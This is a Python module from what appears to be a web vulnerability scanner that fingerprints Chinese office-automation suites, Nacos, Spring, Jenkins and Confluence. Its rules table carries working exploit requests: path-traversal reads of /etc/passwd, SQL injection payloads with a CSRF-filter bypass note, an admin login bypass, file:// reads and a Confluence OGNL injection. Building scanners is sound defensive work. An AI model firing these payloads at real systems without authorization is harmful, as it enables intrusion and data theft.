"""
RayScan OA (办公自动化) 专项检测模块

检测范围:
  - 泛微 Ecology (e-cology) — WorkflowCenterTree SQLi, K8 文件上传, CNVD 漏洞
  - 通达OA (Tongda) — 任意用户登录, SQLi, 文件包含, RCE
  - 金蝶 (Kingdee) — 配置泄露, 反序列化
  - 蓝凌 (Landray) — 文件读取, SSRF
  - 致远 (Seeyon) — 任意文件上传, RCE
  - 用友 (Yonyou) — NC 反序列化, 文件包含
  - 禅道 (Zentao) — SQLi, 任意文件读取
  - 万户 (Whir) — 文件包含, 信息泄露
  - Nacos — 配置泄露, JWT 伪造
  - Spring — Actuator 泄露, SpEL 注入
  - Jenkins — 未授权访问, RCE
  - Confluence — RCE 宏注入
"""

import logging
import re
from typing import Dict, List, Optional

from ...models import Confidence, ScanTarget, Severity, Vulnerability, VulnerabilityType
from ..base import DetectionModule, ModuleInfo, register_module

logger = logging.getLogger("wvs.module.oa")

# ── T0 修复：scanner Step 1.9 注入的短名 → OA_RULES key 别名映射 ──
# nuclei_template_manager.OA_FINGERPRINTS 用短名（"泛微"），OA_RULES 用带后缀名
# （"泛微-Ecology"）；注入值若不映射，OA_RULES.get() 为 None → 检查项全部不执行。
_OA_ALIASES = {
    "泛微": "泛微-Ecology",
    "通达": "通达OA",
    "金蝶": "金蝶-Kingdee",
    "蓝凌": "蓝凌-Landray",
    "致远": "致远-Seeyon",
    "用友": "用友-Yonyou",
    "禅道": "禅道-Zentao",
    "万户": "万户-Whir",
}

# ── OA 系统指纹与检测规则 ──────────────────────────────────────
# 每个 OA 系统的识别路径、关键词、检测端点

OA_RULES: Dict[str, dict] = {
    "泛微-Ecology": {
        "paths": ["/weaver/", "/ecology/", "/wui/"],
        "keywords": ["weaver", "ecology", "e-cology", "eoffice"],
        "checks": [
            {
                "path": "/weaver/weaver.file.FileDownloadForOutDoc",
                "params": {"isFromOutDoc": "true", "downloadFileId": "../../../../etc/passwd"},
                "type": "lfi",
                "severity": "high",
                # 任意文件读取：响应含 /etc/passwd 内容特征
                "evidence": "root:",
            },
            {"path": "/api/portal/weaver/weaver.do", "method": "POST", "type": "rce", "severity": "critical"},
            {
                "path": "/workflow/WorkflowCenterTreeData.jsp",
                "params": {"nodeid": "1' UNION SELECT 1,2,3,4,5,6,7,8,9,10--"},
                "type": "sqli",
                "severity": "high",
            },
        ],
    },
    "通达OA": {
        "paths": ["/ispirit/", "/mac/", "/general/", "/templates/"],
        "keywords": ["tongda", "通达", "td_", "/general/"],
        "checks": [
            {
                # 前台任意用户登录（uid 可控，uid=1 即 admin；codeuid 任意值即可）
                # 影响：< 11.5.200417、2017 版。响应含 "status":1 即登录态写入成功
                "path": "/ispirit/login_code_scan.php",
                "method": "POST",
                "params": {"codeuid": "rayscan", "uid": "1", "source": "pc", "type": "confirm", "username": "admin"},
                "type": "auth_bypass",
                "severity": "critical",
                "evidence": '"status":1',
            },
            {
                "path": "/mac/gateway.php",
                "params": {"json": '{"id":"1\' AND 1=1--"}'},
                "type": "sqli",
                "severity": "high",
            },
            {"path": "/general/document/index.php", "type": "sqli", "severity": "medium"},
        ],
    },
    "金蝶-Kingdee": {
        "paths": ["/kingdee/", "/k3cloud/", "/k3/"],
        "keywords": ["kingdee", "金蝶", "k3cloud"],
        "checks": [
            {
                "path": "/k3cloud/Kingdee.BOS.ServiceFacade.ServicesStub.InstallService.CommonInstallService.commoninstallService.commoninstallServiceHttpFlowService",
                "type": "rce",
                "severity": "critical",
            },
            {
                # CommonFileServer 任意文件读取（6.x/7.x/8.x 均受影响）
                # 读取 Windows 基准文件 win.ini，响应含 [fonts] 节即命中
                "path": "/CommonFileServer/c:/windows/win.ini",
                "type": "file_read",
                "severity": "high",
                "evidence": "[fonts]",
            },
        ],
    },
    "蓝凌-Landray": {
        "paths": ["/landray/", "/sys/", "/km/"],
        "keywords": ["landray", "蓝凌", "ekp"],
        "checks": [
            {
                # CNVD-2021-28277 前台任意文件读取：var 指定 file:// 读取 /etc/passwd
                "path": "/sys/ui/extend/varkind/custom.jsp",
                "method": "POST",
                "params": {"var": '{"body":{"file":"file:///etc/passwd"}}'},
                "type": "file_read",
                "severity": "high",
                "evidence": "root:",
            },
            {
                "path": "/sys/ui/extend/varkind/custom_pf.jsp",
                "params": {"var": "1"},
                "type": "file_read",
                "severity": "high",
            },
        ],
    },
    "致远-Seeyon": {
        "paths": ["/seeyon/", "/yyoa/"],
        "keywords": ["seeyon", "致远", "yyoa"],
        "checks": [
            {"path": "/seeyon/htmlofficeservlet", "type": "rce", "severity": "critical"},
            {"path": "/seeyon/thirdpartyController.do", "type": "rce", "severity": "critical"},
            {
                # CNVD-2021-01627 ajax.do 任意文件上传：上传成功返回 500 + code 08441 开头
                "path": "/seeyon/ajax.do",
                "method": "POST",
                "params": {"method": "uploadPageLayoutAttachment", "managerName": "portalDesignerManager"},
                "type": "file_upload",
                "severity": "high",
                "evidence": '"code":"08441',
                "status_codes": [500],
            },
        ],
    },
    "用友-Yonyou": {
        "paths": ["/yonyou/", "/ufida/", "/nc/"],
        "keywords": ["yonyou", "用友", "ufida", "nccloud"],
        "checks": [
            {"path": "/servlet/~uapss/uploadServlet", "type": "rce", "severity": "critical"},
            {
                # portal/file 任意文件读取：路径遍历读 WEB-INF/web.xml，响应含 <web-app
                "path": "/portal/file",
                "params": {
                    "cmd": "getFileLocal",
                    "fileid": "..%2F..%2F..%2F..%2Fwebapps%2Fnc_web%2FWEB-INF%2Fweb.xml",
                },
                "type": "file_read",
                "severity": "high",
                "evidence": "<web-app",
            },
        ],
    },
    "禅道-Zentao": {
        "paths": ["/zentao/", "/chanzhi/"],
        "keywords": ["zentao", "禅道", "zentaopms"],
        "checks": [
            {
                "path": "/zentao/api-getModel-api-sql.json",
                "params": {"sql": "select+1"},
                "type": "sqli",
                "severity": "critical",
            },
            {
                # CNVD-2022-42853 前台 SQL 注入（16.5 等）：updatexml 报错注入，
                # 注入点 = router setVision() 的 owner='$account' 拼接（非登录查询），
                # 参数走 query string 可绕过 filterCSRF（只清 $_POST 不清 $_GET）。
                # 注意 (user) 会被解析为列名报 Unknown column，必须用 user() 函数。
                "path": "/zentao/user-login.html",
                "method": "POST",
                "params": {"account": "admin' and updatexml(1,concat(0x7e,user(),0x7e),1) and '1'='1"},
                "type": "sqli",
                "severity": "high",
                "evidence": "xpath syntax error",
            },
        ],
    },
    "万户-Whir": {
        "paths": ["/whir/", "/defaultroot/"],
        "keywords": ["whir", "万户"],
        "checks": [
            {
                # evoInterfaceServlet 未授权访问：返回登录账号 + MD5 密码（userList）
                "path": "/defaultroot/evoInterfaceServlet",
                "params": {"paramType": "user"},
                "type": "unauth",
                "severity": "critical",
                "evidence": '"userList"',
            },
        ],
    },
    "Nacos": {
        "paths": ["/nacos/"],
        "keywords": ["nacos"],
        "checks": [
            {
                "path": "/nacos/v1/auth/users?pageNo=1&pageSize=10",
                "type": "unauth",
                "severity": "critical",
                # S3 规则级证据 + 版本过滤：CVE-2021-29441（用户列表未授权访问，
                # 1.4.1 修复）。响应特征 = 用户列表 JSON 的 pageItems 字段。
                "evidence": "pageItems",
                "max_version": "1.4.1",
            },
            {
                "path": "/nacos/v1/cs/configs?dataId=&group=&appName=&config_tags=&pageNo=1&pageSize=10",
                "type": "unauth",
                "severity": "high",
            },
        ],
    },
    "Spring": {
        "paths": ["/actuator/", "/swagger-ui/"],
        "keywords": ["spring", "springboot", "actuator"],
        "checks": [
            {"path": "/actuator/env", "type": "info_disclosure", "severity": "high"},
            {"path": "/actuator/heapdump", "type": "info_disclosure", "severity": "critical"},
        ],
    },
    "Jenkins": {
        "paths": ["/jenkins/", "/jenkins"],
        "keywords": ["jenkins"],
        "checks": [
            {"path": "/jenkins/script", "type": "rce", "severity": "critical"},
            {"path": "/script", "type": "rce", "severity": "critical"},
        ],
    },
    "Confluence": {
        "paths": ["/confluence/"],
        "keywords": ["confluence", "atlassian"],
        "checks": [
            {"path": "/confluence/", "type": "info", "severity": "info"},
            # CVE-2021-26084: Webwork pre-auth OGNL 注入 RCE（queryString 参数）
            # payload 计算 233*233=54289，响应正文含结果即命中
            {
                "path": "/pages/doenterpagevariables.action",
                "type": "rce",
                "severity": "critical",
                "method": "POST",
                "param_type": "body",
                "params": {"queryString": "%5cu0027%2b%7b233*233%7d%2b%5cu0027"},
                "evidence": "54289",
            },
        ],
    },
}

# ── 严重程度映射 ──────────────────────────────────────────────
SEVERITY_MAP = {
    "critical": Severity.CRITICAL,
    "high": Severity.HIGH,
    "medium": Severity.MEDIUM,
    "low": Severity.LOW,
    "info": Severity.INFO,
}

# ── 漏洞类型映射 ──────────────────────────────────────────────
VULN_TYPE_MAP = {
    "sqli": VulnerabilityType.SQL_INJECTION,
    "rce": VulnerabilityType.REMOTE_CODE_EXECUTION,
    "lfi": VulnerabilityType.LFI,
    "file_read": VulnerabilityType.LFI,
    "file_upload": VulnerabilityType.REMOTE_CODE_EXECUTION,
    "auth_bypass": VulnerabilityType.BROKEN_AUTH,
    "unauth": VulnerabilityType.BROKEN_AUTH,
    "info_disclosure": VulnerabilityType.INFO_DISCLOSURE,
    "info": VulnerabilityType.INFO_DISCLOSURE,
}

# ── 响应内容指纹（S3 三级链路第 1 级） ─────────────────────────
# 从首页 HTML/响应头识别 OA 类型（URL 匹配之外的第二通道）。
# match 类型:
#   html   — 响应正文小写子串
#   title  — <title> 标签内容
#   header — 响应头（name 必填；value 为 None 表示头存在即命中）
OA_CONTENT_FINGERPRINTS: Dict[str, List[Dict[str, str]]] = {
    "泛微-Ecology": [
        {"match": "html", "value": "ecology"},
        {"match": "html", "value": "e-cology"},
        {"match": "html", "value": "weaver"},
        {"match": "html", "value": "eoffice"},
    ],
    "通达OA": [
        {"match": "title", "value": "通达oa"},
        {"match": "html", "value": "tongda"},
        {"match": "html", "value": "ispirit"},
        {"match": "html", "value": "td_"},
    ],
    "金蝶-Kingdee": [
        {"match": "title", "value": "金蝶"},
        {"match": "html", "value": "kingdee"},
        {"match": "html", "value": "k3cloud"},
    ],
    "蓝凌-Landray": [
        {"match": "html", "value": "landray"},
        {"match": "html", "value": "ekp"},
        {"match": "html", "value": "lms"},
    ],
    "致远-Seeyon": [
        {"match": "title", "value": "致远"},
        {"match": "html", "value": "seeyon"},
        {"match": "html", "value": "yyoa"},
    ],
    "用友-Yonyou": [
        {"match": "title", "value": "用友"},
        {"match": "html", "value": "yonyou"},
        {"match": "html", "value": "ufida"},
        {"match": "html", "value": "nc cloud"},
    ],
    "禅道-Zentao": [
        {"match": "title", "value": "禅道"},
        {"match": "html", "value": "zentao"},
        {"match": "html", "value": "zentaopms"},
        {"match": "cookie", "value": "zentaosid"},
    ],
    "万户-Whir": [
        {"match": "title", "value": "万户"},
        {"match": "html", "value": "whir"},
    ],
    "Nacos": [
        {"match": "title", "value": "nacos"},
        {"match": "html", "value": "nacos"},
        {"match": "html", "value": "console.nacos"},
    ],
    "Spring": [
        {"match": "title", "value": "whitelabel error page"},
        {"match": "html", "value": "whitelabel error page"},
        {"match": "html", "value": "spring boot"},
    ],
    "Jenkins": [
        {"match": "header", "name": "x-jenkins", "value": None},
        {"match": "title", "value": "jenkins"},
        {"match": "html", "value": "jenkins"},
    ],
    "Confluence": [
        {"match": "title", "value": "confluence"},
        {"match": "html", "value": "atlassian"},
        {"match": "html", "value": "confluence"},
    ],
}


@register_module
class OADetector(DetectionModule):
    """OA 系统专项漏洞检测模块"""

    def __init__(self, config=None, session=None):
        super().__init__(config, session)
        self._detected_oa = None  # 由 scanner 设置检测到的 OA 类型

    @classmethod
    def get_info(cls) -> ModuleInfo:
        return ModuleInfo(
            name="oa",
            description="OA 系统专项检测 — 泛微/通达/金蝶/蓝凌/致远/用友/禅道/万户/Nacos/Spring/Jenkins/Confluence",
            author="RayScan Team",
            version="1.0.0",
            enabled_by_default=False,  # Lite module, needs --all-modules
            tags=["oa", "enterprise", "cms", "vulnerability"],
        )

    async def _scan_impl(self, target: ScanTarget) -> List[Vulnerability]:
        """OA 检测主逻辑"""
        url = target.url.rstrip("/")
        vulnerabilities: List[Vulnerability] = []

        self.logger.info(f"[OA] 开始 OA 专项检测: {url}")

        # Step 1: 识别 OA 类型（S3 三级链路第 1 级）
        #   优先使用 scanner Step 1.9 内容指纹注入值（T0：短名映射到 OA_RULES key）；
        #   否则抓首页做内容指纹 + URL 双通道
        detected_oa = getattr(self, "_detected_oa", None)
        if detected_oa:
            detected_oa = _OA_ALIASES.get(detected_oa, detected_oa)
        html = ""
        headers: Dict[str, str] = {}
        if not detected_oa:
            html, headers = await self._fetch_homepage_for_fingerprint(url)
            detected_oa = self._detect_oa_type(url, html, headers)
        if not detected_oa:
            detected_oa = self._detect_oa_type(url, html, headers)  # URL 兜底

        # S5 增强：根路径无指纹时，探测各 OA 候选子路径（如 Nacos 的 /nacos/、
        # 泛微 /weaver/），用内容指纹识别。解决 OA 部署在 context path 下识别不到的问题。
        if not detected_oa:
            for oa_name, rule in OA_RULES.items():
                for path in rule["paths"]:
                    probe_url = url + path
                    try:
                        resp = await self._send_request("GET", probe_url, {})
                        if resp and resp.get("status_code") == 200:
                            probe_html = resp.get("text", "") or ""
                            probe_headers = resp.get("headers", {}) or {}
                            if self._match_content_fingerprint(oa_name, probe_html, probe_headers):
                                detected_oa = oa_name
                                html = probe_html
                                headers = probe_headers
                                self._detected_oa = oa_name  # 回写实例属性，保持 scanner 状态一致
                                self.logger.info(f"[OA] 子路径探测识别: {oa_name} ({probe_url})")
                                break
                    except Exception:
                        continue
                if detected_oa:
                    break

        # 回写实例属性，保持 scanner 状态一致（scanner 注入与内部检测统一出口）
        if detected_oa:
            self._detected_oa = detected_oa

        if not detected_oa:
            self.logger.info("[OA] 未识别到已知 OA 系统，执行通用 OA 检测")
            # 通用检测: 对所有 OA 的通用路径做轻量检查
            return await self._check_common_oa_paths(url, target)

        self.logger.info(f"[OA] 识别到: {detected_oa}")

        # Step 1.5: 版本识别（S3 三级链路第 2 级，供检查项版本过滤）
        self._detected_version = self._detect_oa_version(detected_oa, html, headers)
        if not self._detected_version and detected_oa == "Nacos":
            # Nacos 1.4.x 首页无版本变量，从 server/state 接口提取（如 {"version":"1.4.0"}）
            for state_path in ("/nacos/v1/console/server/state", "/v1/console/server/state"):
                try:
                    state_resp = await self._send_request("GET", url + state_path, {})
                    if state_resp and state_resp.get("status_code") == 200:
                        import json as _json

                        state = _json.loads(state_resp.get("text", "") or "{}")
                        v = state.get("version")
                        if v:
                            self._detected_version = str(v)
                            break
                except Exception:
                    continue
        if not self._detected_version and detected_oa == "禅道-Zentao":
            # 禅道首页（欢迎页）无版本标记，登录页资源 URL 带 ?v=16.5
            try:
                login_resp = await self._send_request("GET", url + "/zentao/user-login.html", {})
                if login_resp and login_resp.get("status_code") == 200:
                    m = re.search(r"[?&]v=([0-9]+\.[0-9]+(?:\.[0-9]+)?)", login_resp.get("text", "") or "")
                    if m:
                        self._detected_version = m.group(1)
            except Exception:
                pass
        if self._detected_version:
            self.logger.info(f"[OA] 版本识别: {detected_oa} {self._detected_version}")

        # Step 2: 加载对应 OA 的 Nuclei 模板（通过全局 template_manager）
        oa_templates = await self._load_oa_templates(detected_oa)
        if oa_templates:
            self.logger.info(f"[OA] {detected_oa}: 加载了 {len(oa_templates)} 个专门模板")

        # Step 3: 针对该 OA 运行检测规则
        rule = OA_RULES.get(detected_oa)
        if rule:
            for check in rule["checks"]:
                vuln = await self._run_check(url, check, target)
                if vuln:
                    vulnerabilities.append(vuln)

        # Step 4: 通用 OA 路径检查（补充）
        common_vulns = await self._check_common_oa_paths(url, target)
        vulnerabilities.extend(common_vulns)

        return vulnerabilities

    async def _fetch_homepage_for_fingerprint(self, url: str):
        """
        S5 修复：抓首页用于指纹识别，容忍 4xx/5xx 状态码。

        session 对 4xx 抛 RequestError（S1 误报治理：不把错误页当内容），但 OA 指纹
        恰恰依赖错误页正文——Spring Boot 的 Whitelabel Error Page 就是 404。此处用
        独立 httpx 请求拿正文+头，不经过 session 的错误抛出路径。
        """
        try:
            import httpx

            verify_ssl = self.config.get("verify_ssl", True)
            async with httpx.AsyncClient(
                timeout=self.module_config.timeout, verify=verify_ssl, trust_env=False
            ) as client:
                resp = await client.get(url, follow_redirects=True)
                return resp.text or "", dict(resp.headers)
        except Exception as e:
            self.logger.debug(f"[OA] 首页指纹抓取失败 {url}: {e}")
            return "", {}

    @staticmethod
    def _match_content_fingerprint(oa_name: str, html: str, headers: Optional[Dict[str, str]]) -> bool:
        """S3 三级链路第 1 级：按 OA_CONTENT_FINGERPRINTS 匹配响应内容/头。"""
        rules = OA_CONTENT_FINGERPRINTS.get(oa_name, [])
        if not rules:
            return False

        text_lower = html.lower()
        title = ""
        m = re.search(r"<title[^>]*>(.*?)</title>", html, re.I | re.S)
        if m:
            title = m.group(1).strip().lower()

        headers_lower = {k.lower(): str(v).lower() for k, v in (headers or {}).items()}

        for rule in rules:
            match = rule["match"]
            value = rule["value"]
            if match == "header":
                name = rule.get("name", "").lower()
                if name in headers_lower:
                    if value is None or value in headers_lower[name]:
                        return True
            elif match == "title":
                if value in title:
                    return True
            elif match == "cookie":
                if value in headers_lower.get("set-cookie", ""):
                    return True
            else:  # html
                if value in text_lower:
                    return True
        return False

    def _detect_oa_type(self, url: str, html: str = "", headers: Optional[Dict[str, str]] = None) -> Optional[str]:
        """
        识别 OA 系统类型（S3 三级链路第 1 级：内容指纹优先，URL 回退）

        通道 1: 响应内容指纹（title/正文/响应头/Set-Cookie，强信号）
        通道 2: URL 路径/关键词匹配（回退）
        """
        # 通道 1: 内容指纹
        if html or headers:
            for oa_name in OA_RULES:
                if self._match_content_fingerprint(oa_name, html, headers):
                    self.logger.debug(f"[OA] 内容指纹匹配 → {oa_name}")
                    return oa_name

        # 通道 2: URL 路径/关键词
        url_lower = url.lower()
        for oa_name, rule in OA_RULES.items():
            for path in rule["paths"]:
                if path.rstrip("/") in url_lower:
                    self.logger.debug(f"[OA] 路径匹配 → {oa_name}: {path}")
                    return oa_name
            for kw in rule["keywords"]:
                if kw.lower() in url_lower:
                    self.logger.debug(f"[OA] 关键词匹配 → {oa_name}: {kw}")
                    return oa_name

        return None

    def _detect_oa_version(self, oa_name: str, html: str, headers: Optional[Dict[str, str]]) -> Optional[str]:
        """
        S3 三级链路第 2 级：从响应/头提取 OA 版本。

        未识别到版本返回 None（不阻塞检测——版本过滤仅在识别到版本时生效）。
        各 OA 版本特征：
          - Jenkins:  X-Jenkins 响应头
          - Nacos:    页面 JS 中 nacos_version / nacos.version 变量
          - Spring:   页面含 spring-boot 版本字样
          - 泛微:     页面中 ecology 版本变量
          - 禅道:     页面中 zentao 版本变量
        """
        headers_lower = {k.lower(): str(v) for k, v in (headers or {}).items()}

        if oa_name == "Jenkins":
            v = headers_lower.get("x-jenkins")
            if v:
                return str(v).strip()

        if oa_name == "Nacos":
            m = re.search(r"nacos[-_]version[\"']?\s*[:=]\s*[\"']?([0-9]+\.[0-9]+\.[0-9]+)", html, re.I)
            if m:
                return m.group(1)
            m = re.search(r"nacos\.version[\"']?\s*[:=]\s*[\"']?([0-9.]+)", html, re.I)
            if m:
                return m.group(1)

        if oa_name == "Spring":
            m = re.search(r"spring-?boot\s+v?([0-9]+\.[0-9]+(?:\.[0-9]+)?)", html, re.I)
            if m:
                return m.group(1)

        if oa_name in ("泛微-Ecology", "禅道-Zentao"):
            name = "ecology" if oa_name == "泛微-Ecology" else "zentao"
            m = re.search(rf"{name}[\"']?\s*[:=]\s*[\"']?v?([0-9]+\.[0-9]+(?:\.[0-9]+)?)", html, re.I)
            if m:
                return m.group(1)
            # 禅道兜底：资源 URL 版本标记（如 /zentao/js/all.js?v=16.5）
            if oa_name == "禅道-Zentao":
                m = re.search(r"[?&]v=([0-9]+\.[0-9]+(?:\.[0-9]+)?)", html)
                if m:
                    return m.group(1)

        if oa_name == "Confluence":
            # 安装向导/页面 meta: <meta name="ajs-version-number" content="7.4.10">
            m = re.search(r'ajs-version-number"\s+content="([0-9]+\.[0-9]+\.[0-9]+)', html, re.I)
            if m:
                return m.group(1)
            # 兜底: license 申请链接 version=7.4.10&build=8402
            m = re.search(r"version=([0-9]+\.[0-9]+\.[0-9]+)", html, re.I)
            if m:
                return m.group(1)

        return None

    @staticmethod
    def _version_in_range(check: dict, version: Optional[str]) -> bool:
        """
        S3 版本过滤：检查项 min_version/max_version 约束（[min, max) 语义）。

        无版本信息时不阻塞（返回 True）；版本解析失败时不阻塞（保守放行）。
        注意：版本范围来自 CVE 描述，实际环境需校准，误判版本宁可放行检测。
        """
        if not version:
            return True
        min_v = check.get("min_version")
        max_v = check.get("max_version")
        if not min_v and not max_v:
            return True

        try:
            v = tuple(int(x) for x in re.findall(r"\d+", version)[:3])
            if min_v:
                m = tuple(int(x) for x in re.findall(r"\d+", min_v)[:3])
                if v < m:
                    return False
            if max_v:
                m = tuple(int(x) for x in re.findall(r"\d+", max_v)[:3])
                if v >= m:  # [min, max) 语义
                    return False
            return True
        except Exception:
            return True

    async def _run_check(self, base_url: str, check: dict, target: ScanTarget) -> Optional[Vulnerability]:
        """执行单条 OA 检测规则"""
        path = check["path"]
        check_url = base_url.rstrip("/") + path
        method = check.get("method", "GET")
        vuln_type_str = check.get("type", "info")
        severity_str = check.get("severity", "info")
        params = check.get("params", {})
        param_type = check.get("param_type", "query")
        # 允许的响应状态码（默认 200；个别漏洞如致远 ajax.do 上传成功返回 500）
        allowed_status = check.get("status_codes", [200])

        vuln_type = VULN_TYPE_MAP.get(vuln_type_str, VulnerabilityType.OTHER)
        severity = SEVERITY_MAP.get(severity_str, Severity.INFO)

        # S3 版本过滤：检查项 min_version/max_version 约束（如 Nacos < 1.4.1 的 unauth）
        if not self._version_in_range(check, getattr(self, "_detected_version", None)):
            self.logger.debug(
                f"[OA] 版本过滤跳过 {check_url}: 版本 {getattr(self, '_detected_version', None)} 不在约束内"
            )
            return None

        try:
            # S5 续：检查项显式声明非 2xx 成功状态码时（如致远 ajax.do 上传成功返回 500），
            # session 会把 5xx 当错误重试并抛 RequestError、正文丢失，改用独立 httpx
            # 请求容忍该状态码直接拿正文做证据验证。
            if any(not (200 <= s < 300) for s in allowed_status):
                resp = await self._fetch_with_status(method, check_url, params, param_type)
            else:
                resp = await self._send_request(method, check_url, params, param_type=param_type)

            # S1 误报治理：仅允许状态码 + 响应证据验证通过才算漏洞。
            # 移除历史"状态码即漏洞"判定（401/403 被正确拦截 ≠ 未授权访问；
            # 500/302 是错误页/重定向，非漏洞证据；个别漏洞以 500 回显成功特征除外）。
            if resp and resp.get("status_code") in allowed_status:
                status = resp["status_code"]
                body = resp.get("text", "")
                content_type = resp.get("headers", {}).get("content-type", "")

                # S3：检查项规则级 evidence（响应特征）优先于通用类型验证
                found = self._verify_evidence(vuln_type_str, body, content_type, check.get("evidence"))

                if found:
                    return self._create_vuln(
                        url=check_url,
                        param=list(params.keys())[0] if params else None,
                        param_type=param_type,
                        method=method,
                        payload=check_url,
                        # T0 修复：vuln_type 必须是字符串（进 title/tags）；枚举走 explicit_vuln_type，
                        # 否则 tags 含枚举导致报告 JSON 序列化失败
                        vuln_type=vuln_type_str,
                        explicit_vuln_type=vuln_type,
                        severity=severity,
                        confidence=Confidence.MEDIUM,
                        evidence=f"HTTP {status}",
                        description=f"OA 系统 {vuln_type_str.upper()} 漏洞: {check_url}",
                        recommendation="及时更新 OA 系统版本，安装安全补丁",
                        context={"oa_check": check, "status_code": status, "body_preview": body[:100]},
                    )
        except Exception as e:
            self.logger.debug(f"[OA] 检测失败 {check_url}: {e}")

        return None

    async def _fetch_with_status(self, method: str, url: str, params: dict, param_type: str):
        """S5 续：独立 httpx 请求，容忍非 2xx 状态码并保留响应正文。

        session 对 5xx 会重试并抛 RequestError（正文丢失），而个别 OA 漏洞以
        5xx 回显成功特征（如致远 ajax.do 上传成功返回 500 + code 08441）。
        """
        try:
            import httpx

            verify_ssl = self.config.get("verify_ssl", True)
            kwargs = {"timeout": self.module_config.timeout, "verify": verify_ssl, "trust_env": False}
            if method.upper() == "GET":
                if params:
                    kwargs["params"] = params
            else:
                if param_type == "body":
                    kwargs["data"] = params
                elif params:
                    kwargs["params"] = params
            async with httpx.AsyncClient(**kwargs) as client:
                resp = await client.request(method.upper(), url)
                return {
                    "status_code": resp.status_code,
                    "text": resp.text,
                    "headers": dict(resp.headers),
                }
        except Exception as e:
            self.logger.debug(f"[OA] 状态码容忍请求失败 {url}: {e}")
            return None

    @staticmethod
    def _is_html(body: str) -> bool:
        """判断响应是否为 HTML 页面（登录页/错误页/Spa fallback 的特征）"""
        stripped = body.strip().lower()
        return stripped.startswith(("<html", "<!doctype html", "<head", "<!doctype"))

    def _verify_evidence(
        self, vuln_type_str: str, body: str, content_type: str, rule_evidence: Optional[str] = None
    ) -> bool:
        """
        S1 误报治理：按漏洞类型验证响应证据，只有真实漏洞特征才算命中。

        判定原则：宁可漏报，不可把"路径可达/页面存在"报成漏洞。
        S3 增强：`rule_evidence`（检查项级响应特征）优先于通用类型验证——
        规则明确了漏洞响应特征（如特定 JSON 字段）时，直接按特征匹配。
        """
        body_lower = body.lower()

        # S3：规则级证据优先（大小写不敏感子串匹配）
        if rule_evidence:
            return rule_evidence.lower() in body_lower

        if vuln_type_str in ("unauth", "auth_bypass"):
            # 未授权访问：证据 = 返回 JSON 数据（Nacos 用户列表/配置接口、泛微接口），
            # 而非登录页/错误页 HTML。JSON 响应通常较短（如 Nacos 空结果列表），
            # 阈值放宽至 10 以排除空 JSON（{}）即可
            return body.strip().startswith("{") and not self._is_html(body) and len(body) > 10

        if vuln_type_str == "info_disclosure":
            # actuator/env: Spring 配置 JSON 强特征
            if "propertysources" in body_lower or "activeprofiles" in body_lower:
                return True
            # heapdump 等二进制大文件：非 HTML 且体量较大、无错误页特征
            if not self._is_html(body) and len(body) > 1000 and "error" not in body_lower[:200]:
                return True
            return False

        if vuln_type_str == "sqli":
            # 注入成功证据：SQL 报错特征，或（禅道 API）JSON 结果 success 为 true
            sql_error_signs = (
                "syntax error",
                "sqlstate",
                "sql syntax",
                "mysql server",
                "sqlite3",
                "warning: mysql",
                "database error",
                "ora-",
            )
            if any(s in body_lower for s in sql_error_signs):
                return True
            # success 必须为 true 才算命中（"success":false 不是注入成功证据）
            return body.strip().startswith("{") and re.search(r'"success"\s*:\s*true', body_lower) is not None

        if vuln_type_str == "rce":
            # 序列化/二进制载荷回显（致远 htmlofficeservlet GWT、金蝶 BOS）：octet-stream
            # 或 gzip/二进制 magic；Jenkins 脚本控制台：Groovy/Script Console 特征
            if "octet-stream" in content_type.lower():
                return True
            if body[:2] in ("\x1f\x8b", "\x00\x00") or body_lower.startswith("salted"):
                return True
            if "groovy" in body_lower or "script console" in body_lower:
                return True
            return False

        if vuln_type_str == "file_read":
            # 文件读取：证据 = 响应含 JSP 源码特征（蓝凌 custom_pf.jsp 读源码）
            return "<%" in body or "java.io" in body_lower or "import java" in body_lower

        # file_upload / info / 其他：GET 探测无法验证漏洞，保守不报（S3 深化）
        return False

    async def _check_common_oa_paths(self, base_url: str, target: ScanTarget) -> List[Vulnerability]:
        """通用 OA 路径检查 — 仅检查有可靠内容特征的文件泄露路径"""
        vulns = []
        # S1 误报治理：移除 /admin/、/login/、/system/、/api/、/webservice/、/backup/
        # 等"可达即报"泛路径（路径存在/返回 200 不是漏洞证据）。
        # 仅保留可验证内容特征的文件泄露路径。
        common_paths = [
            ("/WEB-INF/web.xml", "<web-app"),  # Java 部署描述符特征
            ("/META-INF/MANIFEST.MF", "manifest-version"),
            ("/.git/HEAD", "ref: "),  # Git HEAD 内容特征
            ("/.env", None),  # 环境变量键值对启发式
        ]

        for path, pattern in common_paths:
            check_url = base_url.rstrip("/") + path
            try:
                resp = await self._send_request("GET", check_url, {})
                if not (resp and resp.get("status_code") == 200):
                    continue
                body = resp.get("text", "")

                if pattern is not None:
                    found = pattern.lower() in body.lower()
                else:
                    # /.env：环境变量常见格式 KEY=value（键为大写下划线）
                    found = bool(re.search(r"^[A-Z][A-Z0-9_]{2,}\s*=\s*\S+", body, re.M))

                if found:
                    vulns.append(
                        self._create_vuln(
                            url=check_url,
                            param=None,
                            param_type="query",
                            method="GET",
                            payload="",
                            explicit_vuln_type=VulnerabilityType.INFO_DISCLOSURE,
                            severity=Severity.LOW,
                            confidence=Confidence.LOW,
                            evidence=pattern or "KEY=value pairs",
                            description=f"发现敏感文件泄露: {check_url}",
                            recommendation="限制敏感路径的外部访问",
                        )
                    )
            except Exception:
                continue

        return vulns

    async def _load_oa_templates(self, oa_name: str) -> List[str]:
        """加载 OA 对应的 Nuclei 模板（通过模板管理器）"""
        try:
            from ...core.nuclei_template_manager import get_template_manager

            tm = get_template_manager()
            if not tm.is_ready:
                return []

            # OA 名称转 tech_stack 标签
            oa_to_tech = {
                "泛微-Ecology": "weaver",
                "通达OA": "tongda",
                "金蝶-Kingdee": "kingdee",
                "蓝凌-Landray": "landray",
                "致远-Seeyon": "seeyon",
                "用友-Yonyou": "yonyou",
                "禅道-Zentao": "zentao",
                "万户-Whir": "whir",
                "Nacos": "nacos",
                "Spring": "spring",
                "Jenkins": "jenkins",
                "Confluence": "confluence",
            }

            tech = oa_to_tech.get(oa_name)
            if not tech:
                return []

            templates = tm.get_templates_for_target(
                tech_stack=[tech],
                severities=["critical", "high", "medium"],
                max_templates=200,
            )
            return templates
        except Exception as e:
            self.logger.debug(f"[OA] 加载模板失败: {e}")
            return []
